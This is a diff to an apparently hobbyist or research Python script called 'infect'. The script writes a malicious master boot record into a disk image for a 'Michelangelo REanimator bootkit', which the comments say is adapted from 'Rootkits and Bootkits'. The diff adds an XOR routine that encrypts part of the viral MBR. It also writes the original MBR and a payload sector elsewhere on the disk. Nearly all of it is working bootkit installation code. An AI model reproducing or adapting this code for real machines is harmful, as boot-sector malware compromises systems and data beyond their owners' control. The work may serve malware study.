@@ -5,11 +5,16 @@ import argparse
 
 #####################################################################
 #	infect writes a malicious MBR to the disk image
-#	created with bximage
+#	a disk image can be created with bximage, qemu-img, 
+#	or another tool
 #	
-#	##Code based on the script from "Rootkits and Bootkits"(Page 213)
+#	##The code was based on the script from 
+#	"Rootkits and Bootkits"(Page 213)
 #	written by Alex Matrosov, Eugene Rodionov and Sergey Bratus
-#
+#	I have adapted the script and added additional features
+# 	including functions that are used to test encryption/decryption 
+#	functionality and routines of the viral MBR for the
+# 	Michelangelo REanimator bootkit
 #####################################################################
 
 def vxinfect(mal_mbr, disk_img, sector_number):
@@ -22,9 +27,33 @@ def vxinfect(mal_mbr, disk_img, sector_number):
 			disk_img_file.write(mbr)
 	return 0
 
+##hardcoding these vals for now
+mbr_crypt_len=0x55
+crypt_offset=0x24
+testkey=0x12
+#def mbr_encrypt(mbr, crypt_offset, mbr_crypt_len):
+def mbr_encrypt(mbr):
+	print("Initial MBR bytes: {0} \n\n".format(mbr))
+	end_byte_index=crypt_offset+mbr_crypt_len
+	mbr_crypt_buf=mbr[crypt_offset:end_byte_index]
+	print("Initial MBR crypting region bytes: {0} \n\n".format(mbr_crypt_buf))
+	decryption_key=bytes([testkey])*(mbr_crypt_len)
+	print("decryption key: {0}".format(decryption_key))	
+	fixed_xor_lambda=lambda x: x[0]^x[1]
+		
+	encrypted_mbr = bytes(fixed_xor_lambda((a,b)) for a,b in zip(decryption_key, mbr_crypt_buf))
+	print("Final MBR crypting region bytes: {0} \n\n".format(encrypted_mbr))
+	mbr_start=mbr[:crypt_offset]
+	mbr_end=mbr[end_byte_index:]
+	entire_mbr=mbr_start+encrypted_mbr+mbr_end
+	print(entire_mbr)
+	#return mbr
+	return entire_mbr	
+
 def vxinfect_this_time_with_feeling(mal_mbr, disk_img, sector_number, og_mbr, og_mbr_sector_number, vxpaint, vxsector_number):
 	with open(mal_mbr, 'rb') as mbr_file:
 		mbr=mbr_file.read()
+		crypted_mbr=mbr_encrypt(mbr)
 		with open(og_mbr, 'rb') as ogmbr_file:
 			ogmbr=ogmbr_file.read()
 			with open(vxpaint, 'rb') as vxpaintfile:
@@ -33,7 +62,7 @@ def vxinfect_this_time_with_feeling(mal_mbr, disk_img, sector_number, og_mbr, og
 					#disk_img_file.seek(0)
 					diskadr_offset=sector_number*512
 					disk_img_file.seek(diskadr_offset)
-					disk_img_file.write(mbr)
+					disk_img_file.write(crypted_mbr)
 					og_mbr_offset=og_mbr_sector_number*512
 					disk_img_file.seek(og_mbr_offset)
 					disk_img_file.write(ogmbr)
